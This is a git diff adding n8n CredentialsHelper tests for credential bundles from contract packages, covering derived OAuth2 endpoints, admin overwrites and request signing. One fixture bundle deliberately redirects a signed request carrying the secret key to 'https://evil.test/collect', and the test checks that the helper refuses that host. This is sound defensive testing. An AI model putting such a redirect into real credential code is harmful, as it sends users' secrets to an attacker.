@@ -24,8 +24,14 @@ import type {
 	INodeCredentialsDetails,
 	IWorkflowExecuteAdditionalData,
 } from 'n8n-workflow';
+import { hostRuntime } from '@n8n/node-sdk/host';
+import { addToStore, manifestTextOf, type CredentialManifest } from '@n8n/node-sdk/registry';
+import { OAuth2Api } from 'n8n-nodes-base/credentials/OAuth2Api.credentials';
 import { deepCopy, jsonParse, Workflow } from 'n8n-workflow';
-import { generateKeyPairSync } from 'node:crypto';
+import { createHash, generateKeyPairSync } from 'node:crypto';
+import { mkdtemp, rm } from 'node:fs/promises';
+import { tmpdir } from 'node:os';
+import path from 'node:path';
 import type { MockInstance } from 'vitest';
 import { mock } from 'vitest-mock-extended';
 
@@ -48,6 +54,7 @@ import { CredentialNotFoundError } from '@/errors/credential-not-found.error';
 import type { LoadNodesAndCredentials } from '@/load-nodes-and-credentials';
 import { MissingExecutionContextError } from '@/modules/dynamic-credentials.ee/errors/missing-execution-context.error';
 import type { ExternalSecretsConfig } from '@/modules/external-secrets.ee/external-secrets.config';
+import { ContractNodeLoader } from '@/node-contracts-registry';
 import type { PolicyEnforcementService } from '@/policy/policy-enforcement.service';
 import type { AiGatewayService } from '@/services/ai-gateway.service';
 
@@ -3385,6 +3392,199 @@ describe('CredentialsHelper', () => {
 
 				expect(result).toEqual({ apiKey: 'test' });
 			});
+		});
+	});
+
+	describe('credential types with code of a contract package', () => {
+		// Bundles as `packCredential` writes them: the default export is the credential type.
+		const derivingBundle = `module.exports = { default: { derive: (fields) => {
+	if ('clientSecret' in fields) throw new Error('derive got a secret');
+	const origin = new URL(fields.server).origin;
+	return {
+		authorizationEndpoint: origin + '/login/oauth/authorize',
+		tokenEndpoint: origin + '/login/oauth/access_token',
+		scope: ['repo', 'user'].join(','),
+		authorizationQuery: { allow_signup: 'false' },
+	};
+} } };`;
+		const signingBundle = `module.exports = { default: { scheme: { sign: async (fields, request) => ({
+	...request,
+	url: request.url.endsWith('/leak') ? 'https://evil.test/collect' : request.url,
+	headers: { 'x-signature': fields.key },
+}) } } };`;
+		const sha256 = (text: string) => createHash('sha256').update(text).digest('hex');
+		const manifestOf = (
+			manifest: Omit<CredentialManifest, 'kind' | 'semver' | 'nodeContract' | 'bundleHash'>,
+			bundle: string,
+		): CredentialManifest => ({
+			kind: 'credential',
+			semver: '1.0.0',
+			nodeContract: '2.13.0',
+			bundleHash: sha256(bundle),
+			...manifest,
+		});
+		const deriving = manifestOf(
+			{
+				id: 'acme.oauth2',
+				name: 'acmeOAuth2Api',
+				displayName: 'Acme OAuth2 API',
+				fields: {
+					type: 'object',
+					properties: {
+						server: {
+							type: 'string',
+							title: 'Server',
+							format: 'uri',
+							default: 'https://api.acme.test',
+						},
+						clientSecret: { type: 'string', title: 'Client Secret', writeOnly: true },
+					},
+					required: ['clientSecret'],
+				},
+				scheme: {
+					kind: 'oauth2',
+					grant: 'authorizationCode',
+					authorizationEndpoint: 'https://acme.test/authorize',
+					tokenEndpoint: 'https://acme.test/token',
+					scope: [],
+					clientAuth: 'client_secret_basic',
+					pkce: true,
+					authorizationQuery: {},
+				},
+				hooks: ['derive'],
+			},
+			derivingBundle,
+		);
+		const signing = manifestOf(
+			{
+				id: 'acme.signed',
+				name: 'acmeSignedApi',
+				displayName: 'Acme Signed API',
+				fields: {
+					type: 'object',
+					properties: { key: { type: 'string', title: 'Key', writeOnly: true } },
+					required: ['key'],
+				},
+				scheme: { kind: 'custom', reason: 'The API signs each request with HMAC.' },
+				hosts: ['api.acme.test'],
+				hooks: ['sign'],
+			},
+			signingBundle,
+		);
+		const state = { dir: '' };
+
+		beforeAll(async () => {
+			state.dir = await mkdtemp(path.join(tmpdir(), 'credential-bundles-'));
+			await addToStore(path.join(state.dir, 'dist', 'store'), [
+				{ manifestText: manifestTextOf(deriving), bundle: derivingBundle },
+				{ manifestText: manifestTextOf(signing), bundle: signingBundle },
+			]);
+		});
+
+		afterAll(async () => {
+			await rm(state.dir, { recursive: true, force: true });
+		});
+
+		const helperWith = async (overwrites: ICredentialDataDecryptedObject = {}) => {
+			const contracts = new ContractNodeLoader(
+				hostRuntime(),
+				[],
+				[],
+				async () => ({ versions: async () => new Map(), credentials: async () => new Map() }),
+				[],
+				() => false,
+				() => ({}),
+				{ name: '@acme/nodes', dir: state.dir },
+			);
+			await contracts.loadAll();
+			const nodesAndCredentials = mock<LoadNodesAndCredentials>();
+			// Set after the mock, so that the mock does not wrap the loader in a proxy.
+			nodesAndCredentials.loaders = { '@acme/nodes': contracts };
+			nodesAndCredentials.getCredential.mockImplementation((name) =>
+				name === 'oAuth2Api'
+					? { type: new OAuth2Api(), sourcePath: '' }
+					: contracts.getCredential(name),
+			);
+			const credentialsOverwrites = mock<CredentialsOverwrites>();
+			credentialsOverwrites.applyOverwrite.mockImplementation((_type, data) => ({
+				...data,
+				...overwrites,
+			}));
+			return new CredentialsHelper(
+				new CredentialTypes(nodesAndCredentials),
+				credentialsOverwrites,
+				credentialsRepository,
+				dynamicCredentialProxy,
+				secretsProviderRepository,
+				licenseState,
+				externalSecretsConfig,
+				mock<AiGatewayService>(),
+				policyEnforcementService,
+			);
+		};
+
+		const decrypted = async (helper: CredentialsHelper) => {
+			credentialsRepository.findOneByOrFail.mockResolvedValue({
+				id: 'cred-acme',
+				name: 'Acme',
+				type: 'acmeOAuth2Api',
+				data: cipher.encryptWithInstanceKey({
+					server: 'https://ghe.acme.test/api/v3',
+					clientId: 'client-1',
+					clientSecret: 'secret-1',
+				}),
+				isResolvable: false,
+				usageScope: 'project',
+			} as CredentialsEntity);
+			policyEnforcementService.enforceCredentialDecrypt.mockResolvedValue(mock());
+			return await helper.getDecrypted(
+				mock<IWorkflowExecuteAdditionalData>({ variables: {} }),
+				{ id: 'cred-acme', name: 'Acme' },
+				'acmeOAuth2Api',
+				'internal',
+			);
+		};
+
+		test('getDecrypted gives the OAuth2 data that derive gives from the fields without secrets', async () => {
+			const data = await decrypted(await helperWith());
+
+			expect(data).toMatchObject({
+				server: 'https://ghe.acme.test/api/v3',
+				clientSecret: 'secret-1',
+				authUrl: 'https://ghe.acme.test/login/oauth/authorize',
+				accessTokenUrl: 'https://ghe.acme.test/login/oauth/access_token',
+				scope: 'repo,user',
+				authQueryParameters: 'allow_signup=false',
+			});
+		});
+
+		test('getDecrypted keeps an admin overwrite over what derive gives', async () => {
+			const data = await decrypted(
+				await helperWith({ accessTokenUrl: 'https://login.acme.test/token' }),
+			);
+
+			expect(data).toMatchObject({
+				authUrl: 'https://ghe.acme.test/login/oauth/authorize',
+				accessTokenUrl: 'https://login.acme.test/token',
+			});
+		});
+
+		test('authenticate signs a request with the bundle and refuses a signed URL outside the hosts', async () => {
+			const helper = await helperWith();
+
+			await expect(
+				helper.authenticate({ key: 'k-1' }, 'acmeSignedApi', {
+					url: 'https://api.acme.test/v1/items',
+				}),
+			).resolves.toEqual({
+				url: 'https://api.acme.test/v1/items',
+				headers: { 'x-signature': 'k-1' },
+			});
+			await expect(
+				helper.authenticate({ key: 'k-1' }, 'acmeSignedApi', { url: 'https://api.acme.test/leak' }),
+			).rejects.toThrow(
+				'Credential acmeSignedApi: the signed request goes to evil.test, which is not a credential host',
+			);
 		});
 	});
 });
